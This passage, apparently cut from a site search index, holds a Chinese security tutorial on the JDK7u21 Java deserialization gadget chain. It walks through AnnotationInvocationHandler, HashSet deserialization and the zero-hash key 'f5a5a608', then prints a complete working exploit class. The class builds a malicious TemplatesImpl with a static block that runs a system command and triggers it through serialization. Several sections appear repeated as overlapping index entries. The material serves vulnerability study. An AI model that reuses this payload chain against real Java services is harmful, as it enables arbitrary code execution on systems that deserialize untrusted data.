\"toString\" )) { return this . toStringImpl (); } else if ( var4 . equals ( \"hashCode\" )) { return this . hashCodeImpl (); } else if ( var4 . equals ( \"annotationType\" )) { return this . type ; } else { Object var6 = this . memberValues . get ( var4 ); if ( var6 == null ) { throw new IncompleteAnnotationException ( this . type , var4 ); } else if ( var6 instanceof ExceptionProxy ) { throw (( ExceptionProxy ) var6 ). generateException (); } else { if ( var6 . getClass (). isArray () && Array . getLength ( var6 ) != 0 ) { var6 = this . cloneArray ( var6 ); } return var6 ; } } } } \u53ef\u89c1\uff0c\u5f53\u65b9\u6cd5\u540d\u7b49\u4e8e\u201cequals\u201d\uff0c\u4e14\u4ec5\u6709\u4e00\u4e2aObject\u7c7b\u578b\u53c2\u6570\u65f6\uff0c\u4f1a\u8c03\u7528\u5230 equalsImpl \u65b9\u6cd5\u3002\u6240\u4ee5\uff0c\u73b0\u5728\u7684\u95ee\u9898\u53d8\u6210\uff0c\u6211\u4eec\u9700\u8981\u627e\u5230\u4e00\u4e2a\u65b9\u6cd5\uff0c\u5728\u53cd\u5e8f\u5217\u5316\u65f6\u5bf9proxy\u8c03\u7528equals\u65b9\u6cd5\u3002 HashSet#readObject # \u6211\u4eec\u67e5\u770bHashSet\u7684readObject\u65b9\u6cd5\uff1a private void readObject ( java . io . ObjectInputStream s ) throws java . io . IOException , ClassNotFoundException { // Read in any hidden serialization magic s . defaultReadObject (); // Read in HashMap capacity and load factor and create backing HashMap int capacity = s . readInt (); float loadFactor = s . readFloat (); map = ((( HashSet ) this ) instanceof LinkedHashSet ? new LinkedHashMap < E , Object > ( capacity , loadFactor ) : new HashMap < E , Object > ( capacity , loadFactor )); // Read in size int size = s . readInt (); // Read in all elements in the proper order. for ( int i = 0 ; i < size ; i ++ ) { E e = ( E ) s . readObject (); map . put ( e , PRESENT ); } } \u8fd9\u91cc\u53ef\u4ee5\u770b\u5230\u53cd\u5e8f\u5217\u5316HashSet\u7684\u65f6\u5019\u4f1a\u5f80\u8c03\u7528\u5185\u90e8\u7684 map#put \u65b9\u6cd5\uff0c\u90a3\u4e48\u6211\u4eec\u518d\u6765\u770b\u770b put \u65b9\u6cd5\u7684\u5b9e\u73b0: public V put ( K key , V value ) { if ( key == null ) return putForNullKey ( value ); int hash = hash ( key ); int i = indexFor ( hash , table . length ); for ( Entry < K , V > e = table [ i ] ; e != null ; e = e . next ) { Object k ; if ( e . hash == hash && (( k = e . key ) == key || key . equals ( k ))) { V oldValue = e . value ; e . value = value ; e . recordAccess ( this ); return oldValue ; } } modCount ++ ; addEntry ( hash , key , value , i ); return null ; } \u8fd9\u91cc\u5c31\u6709\u6211\u4eec\u60f3\u8981\u7684 equals \u65b9\u6cd5\uff0c\u8fd9\u91cc\u6709\u4e00\u6bb5\u903b\u8f91\u662f\u5224\u65ad\u4e24\u4e2akey\u7684hash\u662f\u5426\u76f8\u540c\uff0c\u7136\u540e\u624d\u4f1a\u6267\u884c\u5230\u6216(||)\u540e\u7684\u8bed\u53e5\uff0c\u8c03\u7528 equals \u5224\u65ad\u4e24\u4e2akey\u662f\u5426\u76f8\u540c\uff0c\u6240\u4ee5\u4e3a\u4e86\u6700\u7ec8\u8c03\u7528\u5230 equals \u65b9\u6cd5\uff0c\u6211\u4eec\u5fc5\u987b\u5f80HashSet\u91cc\u653e\u51652\u4e2ahash\u76f8\u540c\u7684\u5bf9\u8c61\u3002\u8fd9\u91cc\u6211\u4eec\u8981\u653e\u5165\u7684\u5bf9\u8c61\u662fTemplatesImpl\uff0c\u800c\u4e3a\u4e86\u89e6\u53d1 AnnotationInvocationHandler.equalsImpl \uff0c\u6211\u4eec\u8fd8\u9700\u8981\u4f7f\u7528\u4e00\u4e2aproxy\u4ee3\u7406\u8fd9\u4e2a\u5bf9\u8c61\uff0c\u6211\u4eec\u9700\u8981\u60f3\u529e\u6cd5\u8ba9\u8fd92\u4e2a\u5bf9\u8c61\u7684hash\u76f8\u540c\u3002 \u5947\u5999\u7684Magic Number # \u8ba1\u7b97\u201c\u54c8\u5e0c\u201d\u7684\u4e3b\u8981\u662f\u4e0b\u9762\u8fd9\u4e24\u884c\u4ee3\u7801\uff1a int hash = hash ( key ); int i = indexFor ( hash , table . length ); hash \u65b9\u6cd5\u7684\u5b9e\u73b0\u5982\u4e0b\uff0c\u53ef\u4ee5\u770b\u5230\u53ea\u6709\u4e00\u4e2a\u53c2\u6570 h=k.hashCode() : final int hash ( Object k ) { int h = 0 ; if ( useAltHashing ) { if ( k instanceof String ) { return sun . misc . Hashing . stringHash32 (( String ) k ); } h = hashSeed ; } h ^= k . hashCode (); // This function ensures that hashCodes that differ only by // constant multiples at each bit position have a bounded // number of collisions (approximately 8 at default load factor). h ^= ( h >>> 20 ) ^ ( h >>> 12 ); return h ^ ( h >>> 7 ) ^ ( h >>> 4 ); } \u6240\u4ee5proxy\u5bf9\u8c61\u4e0eTemplateImpl\u5bf9\u8c61\u7684\u201c\u54c8\u5e0c\u201d\u662f\u5426\u76f8\u7b49\uff0c\u4ec5\u53d6\u51b3\u4e8e\u8fd9\u4e24\u4e2a\u5bf9\u8c61\u7684 hashCode() \u662f\u5426\u76f8\u7b49\u3002TemplateImpl\u7684 hashCode() \u662f\u4e00\u4e2aNative\u65b9\u6cd5\uff0c\u6bcf\u6b21\u8fd0 \u884c\u90fd\u4f1a\u53d1\u751f\u53d8\u5316\uff0c\u6211\u4eec\u7406\u8bba\u4e0a\u662f\u65e0\u6cd5\u9884\u6d4b\u7684\uff0c\u6240\u4ee5\u60f3\u8ba9proxy\u7684 hashCode() \u4e0e\u4e4b\u76f8\u7b49\uff0c\u53ea\u80fd\u5bc4\u5e0c\u671b\u4e8e proxy.hashCode() \u3002 \u6211\u4eec\u77e5\u9053AnnotationInvocationHandler\u9700\u8981\u4f20\u5165\u4e00\u4e2a\u7c7b\u53ca\u4e00\u4e2aMap\u5bf9\u8c61\uff0c\u6211\u4eec\u6700\u7ec8\u8981\u5c06TemplatesImpl\u5bf9\u8c61\u653e\u5165AnnotationInvocationHandler\u7684Map\u4e2d\uff0c\u5f53\u6211\u4eec\u8c03\u7528 proxy.hashCode() \u65f6\uff0c\u4f1a\u8c03\u7528 AnnotationInvocationHandler#invoke \uff0c\u8fdb\u800c\u8c03\u7528\u5230 AnnotationInvocationHandler#hashCodeImpl \uff0c\u6211\u4eec\u770b\u770b\u8fd9\u4e2a\u65b9\u6cd5\uff1a private int hashCodeImpl () { int var1 = 0 ; Entry var3 ; for ( Iterator var2 = this . memberValues . entrySet (). iterator (); var2 . hasNext (); var1 += 127 * (( String ) var3 . getKey ()). hashCode () ^ memberValueHashCode ( var3 . getValue ())) { var3 = ( Entry ) var2 . next (); } return var1 ; } \u5b83\u4f1a\u904d\u5386 memberValues \u8fd9\u4e2aMap\u4e2d\u7684\u6bcf\u4e2akey\u548cvalue\uff0c\u8ba1\u7b97\u6bcf\u4e2a (127 * key.hashCode()) ^ value.hashCode() \u5e76\u6c42\u548c\u3002 JDK7u21\u4e2d\u4f7f\u7528\u4e86\u4e00\u4e2a\u975e\u5e38\u5de7\u5999\u7684\u65b9\u6cd5\uff1a - \u5f53memberValues\u4e2d\u53ea\u6709\u4e00\u4e2akey\u548c\u4e00\u4e2avalue\u65f6\uff0c\u8be5\u54c8\u5e0c\u7b80\u5316\u6210 (127 * key.hashCode()) ^ value.hashCode() - \u5f53 key.hashCode() \u7b49\u4e8e0\u65f6\uff0c\u4efb\u4f55\u6570\u5f02\u62160\u7684\u7ed3\u679c\u4ecd\u662f\u4ed6\u672c\u8eab\uff0c\u6240\u4ee5\u8be5\u54c8\u5e0c\u7b80\u5316\u6210 value.hashCode() \u3002 - \u5f53value\u5c31\u662fTemplateImpl\u5bf9\u8c61\u65f6\uff0c\u8fd9\u4e24\u4e2a\u5bf9\u8c61\u7684\u54c8\u5e0c\u5c31\u5b8c\u5168\u76f8\u7b49 \u6240\u4ee5\u6211\u4eec\u73b0\u5728\u6700\u7ec8\u7684\u95ee\u9898\u5c31\u662f\u627e\u5230\u4e00\u4e2a\u5b57\u7b26\u4e32\u5176hashCode\u4e3a0\uff0c\u8fd9\u91cc\u76f4\u63a5\u7ed9\u51fa\u5176\u4e2d\u4e00\u4e2a\u7b54\u6848: f5a5a608 \uff0c\u8fd9\u4e5f\u662fysoserial\u4e2d\u7528\u5230\u7684\u5b57\u7b26\u4e32\u3002 \u5229\u7528\u94fe\u6784\u9020 # \u6240\u4ee5\uff0c\u6574\u4e2a\u5229\u7528\u7684\u8fc7\u7a0b\u5c31\u6e05\u6670\u4e86\uff0c\u6309\u7167\u5982\u4e0b\u6b65\u9aa4\u6765\u6784\u9020\uff1a - \u9996\u5148\u751f\u6210\u6076\u610f TemplateImpl \u5bf9\u8c61 - \u5b9e\u4f8b\u5316 AnnotationInvocationHandler \u5bf9\u8c61 - \u5b83\u7684type\u5c5e\u6027\u662f\u4e00\u4e2a Templates \u7c7b - \u5b83\u7684 memberValues \u5c5e\u6027\u662f\u4e00\u4e2a Map \uff0c Map \u53ea\u6709\u4e00\u4e2akey\u548cvalue\uff0ckey\u662f\u5b57\u7b26\u4e32 f5a5a608 \uff0c value\u662f\u524d\u9762\u751f\u6210\u7684\u6076\u610f TemplateImpl \u5bf9\u8c61 - \u5bf9\u8fd9\u4e2a AnnotationInvocationHandler \u5bf9\u8c61\u505a\u4e00\u5c42\u4ee3\u7406\uff0c\u751f\u6210proxy\u5bf9\u8c61 - \u5b9e\u4f8b\u5316\u4e00\u4e2a HashSet \uff0c\u8fd9\u4e2a HashSet \u6709\u4e24\u4e2a\u5143\u7d20\uff0c\u5206\u522b\u662f: - TemplateImpl \u5bf9\u8c61 - proxy \u5bf9\u8c61 - \u5c06 HashSet \u5bf9\u8c61\u8fdb\u884c\u5e8f\u5217\u5316 \u8fd9\u6837\uff0c\u53cd\u5e8f\u5217\u5316\u89e6\u53d1\u4ee3\u7801\u6267\u884c\u7684\u6d41\u7a0b\u5982\u4e0b\uff1a - \u89e6\u53d1 HashSet#readObject \u65b9\u6cd5\uff0c\u5176\u4e2d\u4f7f\u7528 HashMap \u7684key\u505a\u53bb\u91cd - \u53bb\u91cd\u65f6\u8ba1\u7b97 HashSet \u4e2d\u7684\u4e24\u4e2a\u5143\u7d20\u7684 hashCode() \uff0c\u56e0\u4e3a\u6211\u4eec\u7684\u7cbe\u5fc3\u6784\u9020\u4e8c\u8005\u76f8\u7b49\uff0c\u8fdb\u800c\u89e6\u53d1 equals() \u65b9\u6cd5 - \u8c03\u7528 AnnotationInvocationHandler#equalsImpl \u65b9\u6cd5 - equalsImpl \u4e2d\u904d\u5386this.type\u7684\u6bcf\u4e2a\u65b9\u6cd5\u5e76\u8c03\u7528 - \u56e0\u4e3athis.type\u662f Templates \u7c7b\uff0c\u6240\u4ee5\u89e6\u53d1\u4e86 newTransform() \u6216 getOutputProperties() \u65b9\u6cd5 - \u4efb\u610f\u4ee3\u7801\u6267\u884c \u6700\u7ec8exp # import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet ; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl ; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl ; import javassist.ClassClassPath ; import javassist.ClassPool ; import javassist.CtClass ; import javax.xml.transform.Templates ; import java.io.ByteArrayInputStream ; import java.io.ByteArrayOutputStream ; import java.io.ObjectInputStream ; import java.io.ObjectOutputStream ; import java.lang.reflect.Constructor ; import java.lang.reflect.Field ; import java.lang.reflect.InvocationHandler ; import java.lang.reflect.Proxy ; import java.util.HashMap ; import java.util.HashSet ; import java.util.LinkedHashSet ; import java.util.Map ; public class jdk7u21 { public static TemplatesImpl generateEvilTemplates () throws Exception { ClassPool pool = ClassPool . getDefault (); pool . insertClassPath ( new ClassClassPath ( AbstractTranslet . class )); CtClass cc = pool . makeClass ( \"Cat\" ); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"calc.exe\\\");\" ; // \u521b\u5efa static \u4ee3\u7801\u5757\uff0c\u5e76\u63d2\u5165\u4ee3\u7801 cc . makeClassInitializer (). insertBefore ( cmd ); String randomClassName = \"EvilCat\" + System . nanoTime (); cc . setName ( randomClassName ); cc . setSuperclass ( pool . get ( AbstractTranslet . class . getName ())); // \u8f6c\u6362\u4e3abytes byte [] classBytes = cc . toBytecode (); byte [][] targetByteCodes = new byte [][] { classBytes }; TemplatesImpl templates = TemplatesImpl . class . newInstance (); setFieldValue ( templates , \"_bytecodes\" , targetByteCodes ); // \u8fdb\u5165 defineTransletClasses() \u65b9\u6cd5\u9700\u8981\u7684\u6761\u4ef6 setFieldValue ( templates , \"_name\" , \"name\" + System . nanoTime ()); setFieldValue ( templates , \"_class\" , null ); setFieldValue ( templates , \"_tfactory\" , new TransformerFactoryImpl ()); return templates ; } public static void main ( String [] args ) throws Exception { TemplatesImpl templates = generateEvilTemplates (); HashMap map = new HashMap (); map . put ( \"f5a5a608\" , \"zero\" ); Constructor handlerConstructor = Class . forName ( \"sun.reflect.annotation.AnnotationInvocationHandler\" ). getDeclaredConstructor ( Class . class , Map . class ); handlerConstructor . setAccessible ( true ); InvocationHandler tempHandler = ( InvocationHandler ) handlerConstructor . newInstance ( Templates . class , map ); // \u4e3atempHandler\u521b\u9020\u4e00\u5c42\u4ee3\u7406 Templates proxy = ( Templates ) Proxy . newProxyInstance ( jdk7u21 . class . getClassLoader (), new Class [] { Templates . class }, tempHandler ); // \u5b9e\u4f8b\u5316HashSet\uff0c\u5e76\u5c06\u4e24\u4e2a\u5bf9\u8c61\u653e\u8fdb\u53bb HashSet set = new LinkedHashSet (); set . add ( templates ); set . add ( proxy ); // \u5c06\u6076\u610ftemplates\u8bbe\u7f6e\u5230map\u4e2d map . put ( \"f5a5a608\" , templates ); ByteArrayOutputStream barr = new ByteArrayOutputStream (); ObjectOutputStream oos = new ObjectOutputStream ( barr ); oos . writeObject ( set ); oos . close (); System . out . println ( barr ); ObjectInputStream ois = new ObjectInputStream ( new ByteArrayInputStream ( barr . toByteArray ())); Object o = ( Object ) ois . readObject (); } public static void setFieldValue ( Object obj , String fieldName , Object value ) throws Exception { Field field = obj . getClass (). getDeclaredField ( fieldName ); field . setAccessible ( true ); field . set ( obj , value ); } } \u8c03\u7528\u903b\u8f91 # HashSet.readObject() HashSet.put() AnnotationInvocationHandler.equals() // \u7cbe\u5fc3\u6784\u9020\u4f7f\u5f972\u4e2a\u5bf9\u8c61\u7684hashCode\u76f8\u540c\uff0c\u89e6\u53d1equals AnnotationInvocationHandler.invoke() AnnotationInvocationHandler.equalsImpl() // \u89e6\u53d1memberMethod.invoke(o) Templates.newTransformer() === TemplatesImpl.newTransformer() // equalsImpl\u4e2d\u4f1a\u53cd\u5c04\u8c03\u7528AnnotationInvocationHandler\u5b9e\u4f8b\u4e2dtype\u5c5e\u6027\u5bf9\u5e94\u7c7b\u7684\u6240\u6709\u65b9\u6cd5\uff0c\u7531\u4e8eAnnotationInvocationHandler\u7684type\u662fTemplates\uff0c\u5219\u4f1a\u53bb\u8c03\u7528Templates\u4e2d\u7684newTransformer TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses() // \u5b9a\u4e49\u7c7b ... // \u521b\u5efa\u7c7b\u5b9e\u4f8b\uff0c\u89e6\u53d1static\u4ee3\u7801\u5757 \u4e0d\u5b8c\u5168\u7684\u4fee\u590d # \u770b\u770b\u5b98\u65b9\u7684\u4fee\u590d\u65b9\u6848: \u5728 sun.reflect.annotation.AnnotationInvocationHandler \u7c7b\u7684 readObject \u51fd\u6570\u4e2d\uff0c\u539f\u672c\u6709\u4e00\u4e2a\u5bf9 this.type \u7684\u68c0\u67e5\uff0c\u5728\u5176\u4e0d\u662f AnnotationType \u7684\u60c5\u51b5\u4e0b\uff0c\u4f1a\u629b\u51fa\u4e00\u4e2a\u5f02\u5e38\u3002\u4f46\u662f\uff0c\u6355\u83b7\u5230\u5f02\u5e38\u540e\u6ca1\u6709\u505a\u4efb\u4f55\u4e8b\u60c5\uff0c\u53ea\u662f\u5c06\u8fd9\u4e2a\u51fd\u6570\u8fd4\u56de\u4e86\uff0c\u8fd9\u6837\u5e76\u4e0d\u5f71\u54cd\u6574\u4e2a\u53cd\u5e8f\u5217\u5316\u7684\u6267\u884c\u8fc7\u7a0b\u3002\u5728\u65b0\u7248\u4e2d\uff0c\u5c06\u8fd9\u4e2a\u8fd4\u56de\u6539\u4e3a\u4e86\u629b\u51fa\u4e00\u4e2a\u5f02\u5e38\uff0c\u4f1a\u5bfc\u81f4\u6574\u4e2a\u5e8f\u5217\u5316\u7684\u8fc7\u7a0b\u7ec8\u6b62\u3002 \u8fd9\u4e2a\u4fee\u590d\u65b9\u5f0f\u770b\u8d77\u6765\u51fb\u4e2d\u8981\u5bb3\uff0c\u5b9e\u9645\u4e0a\u4ecd\u7136\u5b58\u5728\u95ee\u9898\uff0c\u8fd9\u4e5f\u5bfc\u81f4\u540e\u9762\u7684\u53e6\u4e00\u6761\u539f\u751f\u5229\u7528\u94feJDK8u20\u3002","title":"\u53cd\u5e8f\u5217\u5316\u7bc7\u4e4bJDK7u21"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8BJDK7u21/#\u53cd\u5e8f\u5217\u5316\u7bc7\u4e4bjdk7u21","text":"\u611f\u89c9p\u725b\u7684\u6587\u7ae0\u5199\u7684\u975e\u5e38\u597d\uff0c\u5f88\u6e05\u6670\u5730\u628a7u21\u8fd9\u6761\u94fe\u7ed9\u8bb2\u4e86\u4e00\u904d(\u6bd4\u7f51\u4e0a\u641c\u5230\u7684\u51e0\u7bc7\u6587\u7ae0\u90fd\u8bb2\u7684\u660e\u767d\u5f97\u591a)\uff0c\u8fd9\u91cc\u8ddf\u7740p\u725b\u518d\u590d\u73b0\u4e00\u904d\u3002","title":"\u53cd\u5e8f\u5217\u5316\u7bc7\u4e4bJDK7u21"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8BJDK7u21/#annotationinvocationhandlerequalsimpl","text":"JDK7u21\u7684\u4e3b\u8981\u6838\u5fc3\u5728\u4e8e AnnotationInvocationHandler#equalsImpl \uff0c\u4ee3\u7801\u5982\u4e0b: private Boolean equalsImpl ( Object var1 ) { if ( var1 == this ) { return true ; } else if ( ! this . type . isInstance ( var1 )) { return false ; } else { Method [] var2 = this . getMemberMethods (); int var3 = var2 . length ; for ( int var4 = 0 ; var4 < var3 ; ++ var4 ) { Method var5 = var2 [ var4 ] ; String var6 = var5 . getName (); Object var7 = this . memberValues . get ( var6 ); Object var8 = null ; AnnotationInvocationHandler var9 = this . asOneOfUs ( var1 ); if ( var9 != null ) { var8 = var9 . memberValues . get ( var6 ); } else { try { var8 = var5 . invoke ( var1 ); } catch ( InvocationTargetException var11 ) { return false ; } catch ( IllegalAccessException var12 ) { throw new AssertionError ( var12 ); } } if ( ! memberValueEquals ( var7 , var8 )) { return false ; } } return true ; } } private Method [] getMemberMethods () { if ( this . memberMethods == null ) { this . memberMethods = ( Method [] ) AccessController . doPrivileged ( new PrivilegedAction < Method []> () { public Method [] run () { Method [] var1 = AnnotationInvocationHandler . this . type . getDeclaredMethods (); AccessibleObject . setAccessible ( var1 , true ); return var1 ; } }); } return this . memberMethods ; } \u8fd9\u4e2a\u65b9\u6cd5\u4e2d\u6709\u4e2a\u5f88\u660e\u663e\u7684\u53cd\u5c04\u8c03\u7528 memberMethod.invoke(o) \uff0c\u800cmemberMethod\u6765\u81ea\u4e8e this.type.getDeclaredMethods() \u3002 \u4e5f\u5c31\u662f\u8bf4\uff0c equalsImpl \u8fd9\u4e2a\u65b9\u6cd5\u662f\u5c06this.type\u7c7b\u4e2d\u7684\u6240\u6709\u65b9\u6cd5\u904d\u5386\u5e76\u6267\u884c\u4e86\u3002\u90a3\u4e48\uff0c\u5047\u8bbe this.type\u662f Templates \u7c7b\uff0c\u5219\u52bf\u5fc5\u4f1a\u8c03\u7528\u5230\u5176\u4e2d\u7684 newTransformer \u6216 getOutputProperties \u65b9\u6cd5\uff0c\u800c\u8fd9\u4e9b\u65b9\u6cd5\u6700\u7ec8\u90fd\u4f1a\u89e6\u53d1\u4efb\u610fjava\u4ee3\u7801\u6267\u884c: public interface Templates { Transformer newTransformer () throws TransformerConfigurationException ; Properties getOutputProperties (); }","title":"AnnotationInvocationHandler#equalsImpl"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8BJDK7u21/#annotationinvocationhandlerinvoke","text":"\u90a3\u4e48\u6211\u4eec\u8981\u5982\u4f55\u8c03\u7528\u5230 equalsImpl \u65b9\u6cd5\u5462\uff1fequalsImpl\u662f\u4e00\u4e2a\u79c1\u6709\u65b9\u6cd5\uff0c\u5728 AnnotationInvocationHandler#invoke \u4e2d\u88ab\u8c03\u7528\u3002 public Object invoke ( Object var1 , Method var2 , Object [] var3 ) { String var4 = var2 . getName (); Class [] var5 = var2 . getParameterTypes (); if ( var4 . equals ( \"equals\" ) && var5 . length == 1 && var5 [ 0 ] == Object . class ) { return this . equalsImpl ( var3 [ 0 ] ); } else { assert var5 . length == 0 ; if ( var4 . equals ( \"toString\" )) { return this . toStringImpl (); } else if ( var4 . equals ( \"hashCode\" )) { return this . hashCodeImpl (); } else if ( var4 . equals ( \"annotationType\" )) { return this . type ; } else { Object var6 = this . memberValues . get ( var4 ); if ( var6 == null ) { throw new IncompleteAnnotationException ( this . type , var4 ); } else if ( var6 instanceof ExceptionProxy ) { throw (( ExceptionProxy ) var6 ). generateException (); } else { if ( var6 . getClass (). isArray () && Array . getLength ( var6 ) != 0 ) { var6 = this . cloneArray ( var6 ); } return var6 ; } } } } \u53ef\u89c1\uff0c\u5f53\u65b9\u6cd5\u540d\u7b49\u4e8e\u201cequals\u201d\uff0c\u4e14\u4ec5\u6709\u4e00\u4e2aObject\u7c7b\u578b\u53c2\u6570\u65f6\uff0c\u4f1a\u8c03\u7528\u5230 equalsImpl \u65b9\u6cd5\u3002\u6240\u4ee5\uff0c\u73b0\u5728\u7684\u95ee\u9898\u53d8\u6210\uff0c\u6211\u4eec\u9700\u8981\u627e\u5230\u4e00\u4e2a\u65b9\u6cd5\uff0c\u5728\u53cd\u5e8f\u5217\u5316\u65f6\u5bf9proxy\u8c03\u7528equals\u65b9\u6cd5\u3002","title":"AnnotationInvocationHandler#invoke"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8BJDK7u21/#hashsetreadobject","text":"\u6211\u4eec\u67e5\u770bHashSet\u7684readObject\u65b9\u6cd5\uff1a private void readObject ( java . io . ObjectInputStream s ) throws java . io . IOException , ClassNotFoundException { // Read in any hidden serialization magic s . defaultReadObject (); // Read in HashMap capacity and load factor and create backing HashMap int capacity = s . readInt (); float loadFactor = s . readFloat (); map = ((( HashSet ) this ) instanceof LinkedHashSet ? new LinkedHashMap < E , Object > ( capacity , loadFactor ) : new HashMap < E , Object > ( capacity , loadFactor )); // Read in size int size = s . readInt (); // Read in all elements in the proper order. for ( int i = 0 ; i < size ; i ++ ) { E e = ( E ) s . readObject (); map . put ( e , PRESENT ); } } \u8fd9\u91cc\u53ef\u4ee5\u770b\u5230\u53cd\u5e8f\u5217\u5316HashSet\u7684\u65f6\u5019\u4f1a\u5f80\u8c03\u7528\u5185\u90e8\u7684 map#put \u65b9\u6cd5\uff0c\u90a3\u4e48\u6211\u4eec\u518d\u6765\u770b\u770b put \u65b9\u6cd5\u7684\u5b9e\u73b0: public V put ( K key , V value ) { if ( key == null ) return putForNullKey ( value ); int hash = hash ( key ); int i = indexFor ( hash , table . length ); for ( Entry < K , V > e = table [ i ] ; e != null ; e = e . next ) { Object k ; if ( e . hash == hash && (( k = e . key ) == key || key . equals ( k ))) { V oldValue = e . value ; e . value = value ; e . recordAccess ( this ); return oldValue ; } } modCount ++ ; addEntry ( hash , key , value , i ); return null ; } \u8fd9\u91cc\u5c31\u6709\u6211\u4eec\u60f3\u8981\u7684 equals \u65b9\u6cd5\uff0c\u8fd9\u91cc\u6709\u4e00\u6bb5\u903b\u8f91\u662f\u5224\u65ad\u4e24\u4e2akey\u7684hash\u662f\u5426\u76f8\u540c\uff0c\u7136\u540e\u624d\u4f1a\u6267\u884c\u5230\u6216(||)\u540e\u7684\u8bed\u53e5\uff0c\u8c03\u7528 equals \u5224\u65ad\u4e24\u4e2akey\u662f\u5426\u76f8\u540c\uff0c\u6240\u4ee5\u4e3a\u4e86\u6700\u7ec8\u8c03\u7528\u5230 equals \u65b9\u6cd5\uff0c\u6211\u4eec\u5fc5\u987b\u5f80HashSet\u91cc\u653e\u51652\u4e2ahash\u76f8\u540c\u7684\u5bf9\u8c61\u3002\u8fd9\u91cc\u6211\u4eec\u8981\u653e\u5165\u7684\u5bf9\u8c61\u662fTemplatesImpl\uff0c\u800c\u4e3a\u4e86\u89e6\u53d1 AnnotationInvocationHandler.equalsImpl \uff0c\u6211\u4eec\u8fd8\u9700\u8981\u4f7f\u7528\u4e00\u4e2aproxy\u4ee3\u7406\u8fd9\u4e2a\u5bf9\u8c61\uff0c\u6211\u4eec\u9700\u8981\u60f3\u529e\u6cd5\u8ba9\u8fd92\u4e2a\u5bf9\u8c61\u7684hash\u76f8\u540c\u3002","title":"HashSet#readObject"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8BJDK7u21/#\u5947\u5999\u7684magic-number","text":"\u8ba1\u7b97\u201c\u54c8\u5e0c\u201d\u7684\u4e3b\u8981\u662f\u4e0b\u9762\u8fd9\u4e24\u884c\u4ee3\u7801\uff1a int hash = hash ( key ); int i = indexFor ( hash , table . length ); hash \u65b9\u6cd5\u7684\u5b9e\u73b0\u5982\u4e0b\uff0c\u53ef\u4ee5\u770b\u5230\u53ea\u6709\u4e00\u4e2a\u53c2\u6570 h=k.hashCode() : final int hash ( Object k ) { int h = 0 ; if ( useAltHashing ) { if ( k instanceof String ) { return sun . misc . Hashing . stringHash32 (( String ) k ); } h = hashSeed ; } h ^= k . hashCode (); // This function ensures that hashCodes that differ only by // constant multiples at each bit position have a bounded // number of collisions (approximately 8 at default load factor). h ^= ( h >>> 20 ) ^ ( h >>> 12 ); return h ^ ( h >>> 7 ) ^ ( h >>> 4 ); } \u6240\u4ee5proxy\u5bf9\u8c61\u4e0eTemplateImpl\u5bf9\u8c61\u7684\u201c\u54c8\u5e0c\u201d\u662f\u5426\u76f8\u7b49\uff0c\u4ec5\u53d6\u51b3\u4e8e\u8fd9\u4e24\u4e2a\u5bf9\u8c61\u7684 hashCode() \u662f\u5426\u76f8\u7b49\u3002TemplateImpl\u7684 hashCode() \u662f\u4e00\u4e2aNative\u65b9\u6cd5\uff0c\u6bcf\u6b21\u8fd0 \u884c\u90fd\u4f1a\u53d1\u751f\u53d8\u5316\uff0c\u6211\u4eec\u7406\u8bba\u4e0a\u662f\u65e0\u6cd5\u9884\u6d4b\u7684\uff0c\u6240\u4ee5\u60f3\u8ba9proxy\u7684 hashCode() \u4e0e\u4e4b\u76f8\u7b49\uff0c\u53ea\u80fd\u5bc4\u5e0c\u671b\u4e8e proxy.hashCode() \u3002 \u6211\u4eec\u77e5\u9053AnnotationInvocationHandler\u9700\u8981\u4f20\u5165\u4e00\u4e2a\u7c7b\u53ca\u4e00\u4e2aMap\u5bf9\u8c61\uff0c\u6211\u4eec\u6700\u7ec8\u8981\u5c06TemplatesImpl\u5bf9\u8c61\u653e\u5165AnnotationInvocationHandler\u7684Map\u4e2d\uff0c\u5f53\u6211\u4eec\u8c03\u7528 proxy.hashCode() \u65f6\uff0c\u4f1a\u8c03\u7528 AnnotationInvocationHandler#invoke \uff0c\u8fdb\u800c\u8c03\u7528\u5230 AnnotationInvocationHandler#hashCodeImpl \uff0c\u6211\u4eec\u770b\u770b\u8fd9\u4e2a\u65b9\u6cd5\uff1a private int hashCodeImpl () { int var1 = 0 ; Entry var3 ; for ( Iterator var2 = this . memberValues . entrySet (). iterator (); var2 . hasNext (); var1 += 127 * (( String ) var3 . getKey ()). hashCode () ^ memberValueHashCode ( var3 . getValue ())) { var3 = ( Entry ) var2 . next (); } return var1 ; } \u5b83\u4f1a\u904d\u5386 memberValues \u8fd9\u4e2aMap\u4e2d\u7684\u6bcf\u4e2akey\u548cvalue\uff0c\u8ba1\u7b97\u6bcf\u4e2a (127 * key.hashCode()) ^ value.hashCode() \u5e76\u6c42\u548c\u3002 JDK7u21\u4e2d\u4f7f\u7528\u4e86\u4e00\u4e2a\u975e\u5e38\u5de7\u5999\u7684\u65b9\u6cd5\uff1a - \u5f53memberValues\u4e2d\u53ea\u6709\u4e00\u4e2akey\u548c\u4e00\u4e2avalue\u65f6\uff0c\u8be5\u54c8\u5e0c\u7b80\u5316\u6210 (127 * key.hashCode()) ^ value.hashCode() - \u5f53 key.hashCode() \u7b49\u4e8e0\u65f6\uff0c\u4efb\u4f55\u6570\u5f02\u62160\u7684\u7ed3\u679c\u4ecd\u662f\u4ed6\u672c\u8eab\uff0c\u6240\u4ee5\u8be5\u54c8\u5e0c\u7b80\u5316\u6210 